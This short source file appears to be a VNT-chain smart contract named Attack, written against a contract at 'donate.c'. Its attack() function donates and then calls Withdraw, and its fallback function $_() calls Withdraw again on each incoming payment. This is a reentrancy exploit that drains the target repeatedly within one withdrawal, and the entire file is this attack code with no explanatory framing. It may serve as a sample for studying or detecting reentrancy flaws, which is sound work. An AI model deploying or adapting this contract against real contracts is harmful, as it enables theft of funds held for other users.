#include "vntlib.h"

KEY address owner;

constructor Attack(){
    owner = GetSender();
}

 
CALL void Withdraw(CallParams params, uint256 amount);
CallParams params1 = {Address("donate.c"), U256(10000), 1000};
CALL void $donate(CallParams params);
CallParams params2 = {Address("donate.c"), U256(10000), 1000};

MUTABLE     
void attack() {
    $donate(params2);
    Withdraw(params1, 10);
}

$_() {
    Withdraw(params1, 10);
}








